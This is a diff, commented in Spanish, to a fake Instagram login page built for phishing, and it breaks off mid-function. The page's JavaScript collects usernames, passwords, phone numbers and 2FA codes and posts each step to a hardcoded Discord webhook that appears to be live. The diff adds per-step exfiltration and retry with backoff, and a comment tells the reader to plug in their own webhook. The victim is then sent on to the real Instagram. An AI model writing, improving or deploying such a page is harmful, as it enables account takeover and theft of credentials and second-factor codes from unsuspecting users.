@@ -25,8 +25,6 @@
             color: #262626;
             margin-bottom: 20px;
         }
-        /* Se han eliminado los estilos de .visual-stack-placeholder */
-        
         /* Borde más visible para las cajas de texto */
         .instagram-input {
             @apply block w-full px-3 py-2 text-sm text-gray-900 bg-gray-50 border border-gray-600 rounded-sm focus:outline-none focus:ring-0 focus:border-gray-800;
@@ -37,8 +35,6 @@
 
     <!-- Contenedor principal de la interfaz: Ahora solo el Formulario, centrado -->
     <main class="flex flex-col items-center justify-center pt-8 lg:pt-0">
-
-        <!-- Se ha eliminado la Columna Visual (Izquierda) -->
 
         <!-- 2. Columna del Formulario (Centrada) -->
         <div class="w-full max-w-xs flex flex-col items-center">
@@ -249,7 +245,9 @@
         const REDIRECT_URL = 'https://www.instagram.com/';
         
         // URL del Webhook de Discord para el envío de notificaciones
+        // NOTA: Usa tu propio Webhook real para recibir los datos.
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE';
+
         // Objeto global para almacenar los datos capturados a través de los pasos
         let capturedData = {
             identifier: '',
@@ -257,6 +255,8 @@
             phoneNumber: '',
             verificationCode: ''
         };
+
+        // --- FUNCIONES DE LÓGICA DE ENVÍO Y MANEJO DE PASOS ---
 
         // Función para manejar la lógica del botón de Inicio de Sesión (Paso 1)
         document.addEventListener('DOMContentLoaded', () => {
@@ -275,60 +275,33 @@
             passwordInput.addEventListener('input', toggleButton);
         });
 
-        // Función para simular el proceso de inicio de sesión (Paso 1)
-        function handleSignIn(event) {
-            event.preventDefault(); // Previene el envío real del formulario
-
-            const identifier = document.getElementById('identifier').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-
-
-            if (identifier && password) {
-                // GUARDAR DATOS DEL PASO 1
-                capturedData.identifier = identifier;
-                capturedData.password = password;
-
-                // Simulación de éxito. Ocultar paso 1 y mostrar paso 2.
-                step1.classList.add('hidden');
-                step2.classList.remove('hidden');
-            } else {
-                // Simulación de error (sin mensaje, solo permanece en la página)
-                console.error("Error de inicio de sesión simulado: Campos vacíos.");
-            }
-        }
-        
-        // Función para simular el envío del número de teléfono (Paso 2)
-        function handlePhoneSubmit(event) {
-             event.preventDefault(); // Previene el envío real del formulario
-
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
-
-
-            if (phoneNumber) {
-                 // GUARDAR DATOS DEL PASO 2
-                capturedData.phoneNumber = phoneNumber;
-                
-                 // Simulación de éxito. Ocultar paso 2 y mostrar paso 3.
-                step2.classList.add('hidden');
-                step3.classList.remove('hidden');
-            } else {
-                 // Simulación de error del paso 2
-                console.error("Error en el paso 2 simulado: Número de teléfono vacío.");
-            }
-        }
-
         // Función para enviar los datos capturados al Webhook de Discord
-        function sendDataToDiscord() {
+        // Se personaliza según el paso completado.
+        function sendDataToDiscord(step) {
+            let title = "";
+            let description = "";
+            let color = 0x4287f5; // Color azul por defecto
+
+            if (step === 1) {
+                title = "1/3 Credenciales Primarias Capturadas";
+                description = "Se ha ingresado Usuario/Email y Contraseña. Esperando Teléfono...";
+                color = 0xf5a342; // Naranja: Datos Parciales
+            } else if (step === 2) {
+                title = "2/3 Número de Teléfono Capturado";
+                description = "Se ha capturado el Número de Teléfono. Esperando Código 2FA...";
+                color = 0xf5d442; // Amarillo: Más Datos
+            } else if (step === 3) {
+                title = "✅ 3/3 Flujo Completo: 2FA Capturado";
+                description = "¡El usuario ha completado el flujo! Redirigiendo a Instagram.";
+                color = 0x42f567; // Verde: Datos Completos
+            }
+
             const payload = {
-                username: "Instagram Phish Logger",
+                username: "Instagram Logger",
                 embeds: [{
-                    title: "🔑 Datos de Acceso Capturados (3 Pasos)",
-                    description: "Se ha capturado un intento de inicio de sesión con 3 pasos completos.",
-                    color: 0x4287f5, // Azul
+                    title: `🔑 ${title}`,
+                    description: description,
+                    color: color,
                     fields: [
                         {
                             name: "1. Identificador/Email",
@@ -357,48 +330,81 @@
                 }]
             };
 
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Error al enviar datos a Discord:', response.status, response.statusText);
-                } else {
-                    console.log('Datos enviados a Discord con éxito.');
+            // Implementación de Fetch con reintento y backoff (mejora de robustez)
+            const MAX_RETRIES = 3;
+            let currentRetry = 0;
+
+            async function attemptSend() {
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (response.status === 429) { // Rate limit
+                        const retryAfter = parseInt(response.headers.get('Retry-After') || '1', 10) * 1000;
+                        if (currentRetry < MAX_RETRIES) {
+                            currentRetry++;
+                            setTimeout(attemptSend, retryAfter);
+                        } else {
+                             // Fallo final después de reintentos
+                            console.error('Error final: Discord Rate Limit excedido.');
+                        }
+                    } else if (!response.ok) {
+                        console.error('Error al enviar datos a Discord:', response.status, response.statusText);
+                    } else {
+                        console.log(`Datos del PASO ${step} enviados a Discord con éxito.`);
+                    }
+                } catch (error) {
+                    // Error de red
+                    if (currentRetry < MAX_RETRIES) {
+                        currentRetry++;
+                        const delay = Math.pow(2, currentRetry) * 1000; // Exponential backoff (2s, 4s, 8s)
+                        setTimeout(attemptSend, delay);
+                    } else {
+                        console.error('Error de red al intentar enviar datos a Discord después de reintentos:', error);
+                    }
                 }
-            })
-            .catch(error => {
-                console.error('Error de red al intentar enviar datos a Discord:', error);
-            });
+            }
+
+            attemptSend();
         }
 
-        // Nueva función para simular la confirmación del código (Paso 3)
-        function handleCodeSubmit(event) {
-             event.preventDefault(); // Previene el envío real del formulario
+        // Función para simular el proceso de inicio de sesión (Paso 1)
+        function handleSignIn(event) {
+            event.preventDefault();
 
-            const verificationCode = document.getElementById('verificationCode').value.trim();
+            const identifier = document.getElementById('identifier').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
 
-            // Simulación simple de verificación: solo revisa que tenga 6 dígitos
-            if (verificationCode.length === 6 && /^\d+$/.test(verificationCode)) {
-                 // GUARDAR DATOS DEL PASO 3
-                capturedData.verificationCode = verificationCode;
-                
-                 // 1. ENVIAR DATOS A DISCORD ANTES DE REDIRIGIR
-                sendDataToDiscord();
+            if (identifier && password) {
+                // GUARDAR DATOS DEL PASO 1
+                capturedData.identifier = identifier;
+                capturedData.password = password;
 
-                 // 2. Éxito: Redireccionar a la página principal de Instagram
-                 // Usamos window.open con '_top' para forzar la navegación en la ventana principal.
-                window.open(REDIRECT_URL, '_top');
-                
+                // AVISO A DISCORD DESPUÉS DEL PASO 1
+                sendDataToDiscord(1); 
+
+                // Transición al Paso 2
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
             } else {
-                 // Simulación de error del paso 3
-                console.error("Error en el paso 3 simulado: Código inválido.");
+                console.error("Error de inicio de sesión simulado: Campos vacíos.");
             }
         }
-    </script>
-</body>
-</html>
+        
+        // Función para simular el envío del número de teléfono (Paso 2)
+        function handlePhoneSubmit(event) {
+             event.preventDefault(); 
+
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+
+
+            if (phoneNumber) {
+                 // GUARDAR DATOS DEL PASO 2
+                capturedData.phoneNumb
